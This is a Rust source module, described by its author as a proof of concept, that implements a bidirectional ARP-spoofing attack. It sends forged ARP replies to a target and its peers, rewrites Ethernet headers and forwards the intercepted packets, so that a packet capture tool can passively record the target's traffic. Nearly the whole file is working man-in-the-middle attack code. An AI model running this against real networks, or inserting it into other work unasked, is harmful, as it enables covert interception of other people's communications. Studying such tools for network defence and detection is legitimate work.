//! Warning: This code is a proof-of-concept, and is subject to change as my routing engine is
//! fleshed out (since that will have more robust packet handling I can use). There are some
//! convoluded sections, panics, and lots of hard-coded values like timeouts. That being said,
//! I'm pretty proud of what it can *do*.
//!
//! This module provides an arp-spoofing state machine intended for use in a ticking loop.
//! It executes a bidirectional arp-spoofing attack with proxying mechanisms to reroute the
//! packets to their final destination, allowing for passive recording of traffic. It does
//! this by sending ARP replies to both the target *and* its peers, telling the target that
//! we are all of its peers, and telling all its peers that we are the target, prompting them
//! to send all their traffic to us instead. We then unwrap the packets and rewrite the ethernet
//! header to send them where they were actually supposed to go.
//!
//! With this code running, a tcpdump or wireshark process can record the target's traffic
//! to/from its peers. However, due to the rewrite of the ethernet header, each packet shows up
//! twice. This can be easily remedied by filtering on our mac address as the destination.

#![allow(dead_code)]

use std::{
    io::ErrorKind,
    net::{IpAddr, Ipv4Addr},
    time::{Duration, Instant},
};

use pnet::{
    datalink::{DataLinkReceiver, DataLinkSender, NetworkInterface},
    packet::{
        arp::{ArpOperations, ArpPacket},
        ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket},
        ipv4::Ipv4Packet,
        Packet,
    },
};
use rustc_hash::FxHashSet;

use super::utils::{create_arp_reply_v4_eth, create_arp_request_v4_eth, get_rawsock, ArpTable};

/// This implements an async state machine that allows the user to perform an arp spoofing
/// attack. This allows the user to capture the traffic of another device.
pub struct ArpSpoofer {
    can_spoof: bool,
    // Captures bidirectional traffic by also spoofing the target to the peer
    bidirectional: bool,
    interface: NetworkInterface,
    socket_send: Box<dyn DataLinkSender>,
    socket_recv: Box<dyn DataLinkReceiver>,
    last_spoof: Instant,
    gateway: Ipv4Addr,
    target: Ipv4Addr,
    spoof_ips: FxHashSet<Ipv4Addr>,
    arp_table: ArpTable,
}
impl ArpSpoofer {
    pub fn new(
        interface_name: &str,
        target: Ipv4Addr,
        bidirectional: bool,
        gateway: Ipv4Addr,
    ) -> std::io::Result<Self> {
        let (interface, socket_send, socket_recv) =
            get_rawsock(interface_name, Some(Duration::from_millis(1)))?;
        if interface.mac.is_none() {
            return Err(std::io::Error::new(
                ErrorKind::NotFound,
                "Interface missing mac address",
            ));
        }
        return Ok(Self {
            arp_table: ArpTable::new(interface.mac.unwrap()),
            can_spoof: false,
            bidirectional,
            interface,
            socket_send,
            socket_recv,
            last_spoof: Instant::now(),
            gateway,
            target,
            spoof_ips: FxHashSet::default(),
        });
    }
    pub fn send_spoofs(&mut self) -> std::io::Result<()> {
        let target_mac = self.arp_table.get_entry(self.target);
        let target_tuple = match target_mac {
            Some(target_mac) => Some((self.target, target_mac)),
            None => {
                return Err(std::io::Error::new(
                    ErrorKind::NotFound,
                    "Target mac not found",
                ))
            }
        };

        for ip in self.spoof_ips.iter().cloned() {
            // Capture target -> peer
            let packet = create_arp_reply_v4_eth(target_tuple, ip, self.interface.mac.unwrap());
            self.socket_send.send_to(&packet, None);

            // Capture peer -> target
            match (self.bidirectional, self.arp_table.get_entry(ip)) {
                (true, Some(mac_addr)) => {
                    let packet = create_arp_reply_v4_eth(
                        Some((ip, mac_addr)),
                        self.target,
                        self.interface.mac.unwrap(),
                    );
                    self.socket_send.send_to(&packet, None);
                }
                (true, None) => {
                    if self
                        .arp_table
                        .should_request(ip, Duration::from_millis(100))
                    {
                        // Send ARP request.
                        let request = create_arp_request_v4_eth(
                            ip,
                            // Seems like devices respond to an invalid IP here.
                            // All they really need is the mac address, and we
                            // may not have an IP.
                            Ipv4Addr::from_bits(0),
                            self.interface.mac.unwrap(),
                        );
                        self.socket_send.send_to(&request, None).unwrap()?;
                    }
                }
                (false, _) => {}
            }
        }

        return Ok(());
    }
    pub fn add_peer(&mut self, target: Ipv4Addr) {
        self.spoof_ips.insert(target);
    }
    pub fn remove_peer(&mut self, target: Ipv4Addr) {
        self.spoof_ips.remove(&target);
    }
    pub fn tick(&mut self) -> std::io::Result<()> {
        /*
            If we're missing info for our target, query it.
            If we're missing info for our router, query it.
            Try receiving a packet for 5ms.
            If we timed out, send a spoofed arp reply.
            If we got the packet,
                check if it was for our target.
                    If it was, forward it
                check if it was for the router.
                    If it was, forward it.
        */

        // Check for target information.
        if !self.can_spoof {
            if self.arp_table.get_entry(self.target).is_none()
                && self
                    .arp_table
                    .should_request(self.target, Duration::from_millis(50))
            {
                // Send ARP request.
                let request = create_arp_request_v4_eth(
                    self.target,
                    // Seems like devices respond to an invalid IP here.
                    // All they really need is the mac address, and we
                    // may not have an IP.
                    Ipv4Addr::from_bits(0),
                    self.interface.mac.unwrap(),
                );
                self.socket_send.send_to(&request, None).unwrap()?;
            } else {
                self.can_spoof = true;
            }
        }

        if self.can_spoof && self.last_spoof.elapsed() > Duration::from_millis(200) {
            self.send_spoofs()?;
        }

        let packet = match self.socket_recv.next() {
            Ok(result) => result,
            Err(err) if err.kind() == ErrorKind::TimedOut => return Ok(()),
            Err(err) => return Err(err.into()),
        };
        let packet = match EthernetPacket::new(packet) {
            Some(packet) => packet,
            None => return Ok(()),
        };

        match packet.get_ethertype() {
            EtherTypes::Arp => match ArpPacket::new(packet.payload()) {
                Some(arp_packet) => {
                    if arp_packet.get_protocol_type() != EtherTypes::Ipv4
                        || arp_packet.get_operation() != ArpOperations::Reply
                    {
                        return Ok(());
                    }
                    self.arp_table.add_entry(
                        arp_packet.get_sender_proto_addr(),
                        arp_packet.get_sender_hw_addr(),
                    );
                }
                // Nothing we can do. It's not a valid packet.
                None => return Ok(()),
            },
            EtherTypes::Ipv4 => match Ipv4Packet::new(packet.payload()) {
                Some(ip4_packet) => {
                    // Identify packet. If it's for or from our target, pass it on.
                    let dest_ip = ip4_packet.get_destination();
                    let src_ip = ip4_packet.get_source();
                    let forward = if self.bidirectional {
                        self.target == dest_ip
                            || self.target == src_ip
                            || self
                                .spoof_ips
                                .iter()
                                .any(|ip| *ip == src_ip || *ip == dest_ip)
                    } else {
                        !self.interface.ips.iter().any(|net| net.ip() == dest_ip)
                    };
                    if forward {
                        // Rewrite the ethernet header using our internal ARP table
                        let mut new_packet = Vec::<u8>::with_capacity(packet.payload().len());
                        new_packet.resize(packet.packet().len(), 0);
                        let mut new_eth_packet =
                            MutableEthernetPacket::new(&mut new_packet).unwrap();

                        // Check if the packet is on the LAN
                        let is_lan = self
                            .interface
                            .ips
                            .iter()
                            .any(|net| net.contains(IpAddr::V4(ip4_packet.get_destination())));
                        let eth_dest = match self.arp_table.get_entry_or_request(
                            if is_lan {
                                ip4_packet.get_destination()
                            } else {
                                self.gateway
                            },
                            &mut self.socket_send,
                        )? {
                            Some(result) => result,
                            // Can't forward the packet. ArpTable already sent a request if it was valid
                            None => return Ok(()),
                        };
                        new_eth_packet.set_destination(eth_dest);
                        new_eth_packet.set_source(self.interface.mac.unwrap());
                        new_eth_packet.set_ethertype(EtherTypes::Ipv4);
                        new_eth_packet.set_payload(ip4_packet.packet());

                        // Send packet
                        self.socket_send.send_to(new_eth_packet.packet(), None);
                    }
                }
                None => return Ok(()),
            },
            _ => {}
        }

        return Ok(());
    }
}
